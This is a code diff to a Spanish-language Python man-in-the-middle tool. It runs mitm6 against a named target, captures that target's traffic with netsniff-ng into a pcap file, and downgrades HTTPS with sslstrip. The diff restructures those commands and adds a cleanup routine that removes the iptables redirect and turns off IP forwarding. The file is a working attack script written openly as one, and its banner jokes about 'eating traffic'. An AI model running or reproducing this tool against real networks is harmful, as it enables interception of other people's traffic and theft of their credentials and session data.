@@ -72,9 +72,12 @@ def attack():
 	banner2()
 	print(G+"[>] "+W+"Tomate un coffee mientras comemos trafico "+G+":)")
 	print(B+"[*] "+W+"Abriendo trafico entre "+parse.target+" y "+parse.gateway)
-	os.system("xterm -geometry 100x30 -e 'sudo mitm6 --ignore-nofqdn -l "+parse.localdomain+" -b "+parse.target+" -i "+parse.interface+"' | xterm -geometry 120x30 -e 'sudo netsniff-ng --in "+parse.interface+" --out "+export+"' | xterm -geometry 100x30 -e 'sslstrip -p "+parse.port+"'")
+	cmd_mitm6 = "xterm -bg black -fg green -geometry 100x30 -e 'sudo mitm6 --ignore-nofqdn -l "+parse.localdomain+" -b "+parse.target+" -i "+parse.interface + "'"
+	cmd_netsniff_ng = "xterm -bg black -fg green -geometry 120x30 -e 'sudo netsniff-ng --in " + parse.interface + " --out " + export + "'"
+	cmd_sslstrip = "xterm -bg black -fg green -geometry 100x30 -e 'sslstrip -p " + parse.port + "'"
+	os.system(cmd_mitm6 + " & " + cmd_netsniff_ng + " & " + cmd_sslstrip)
 	print(B+"[*] "+W+"Escuchando trafico generalizado en pcap y exportandolo como "+export)
-
+	input("")
 # Argumentos
 parse = argparse.ArgumentParser()
 parse.add_argument("-p", "--port", help="Establecer puerto a trabajar")
@@ -84,9 +87,26 @@ parse.add_argument("-l", "--localdomain", help="Establecer ip local del sistema"
 parse.add_argument("-i", "--interface", help="Establecer interfaz de red")
 parse = parse.parse_args()
 
-banner()
+def disable_poisoning():
+    print(B+"[*]"+GRs+" Desactivando IP forward")
+    os.system("sudo echo 0 > /proc/sys/net/ipv4/ip_forward")
+    print(B+"[*]"+GRs+" Eliminando reglas de iptables...")
+    os.system("sudo iptables -t nat -D PREROUTING -p tcp --destination-port 80 -j REDIRECT --to-port 8080")
+    print(G+"[+] Reglas desactivadas...")
+    time.sleep(2)
+    os.system("clear")
+    banner2()
+
+# Llama a esta función después de main() en caso de que quieras desactivar la envenenación
+# disable_poisoning()
+
+
+
+
+
 
 def main():
+	banner()
 	if parse.interface:
 		iface = parse.interface
 		print(G+"[>] "+W+"Interfaz a trabajar : "+P+iface)
@@ -120,5 +140,6 @@ if __name__ == "__main__":
 	except KeyboardInterrupt:
 		os.system("clear")
 		banner()
+		disable_poisoning()
 		print(R+"[-] Programa terminado.")
 		exit()
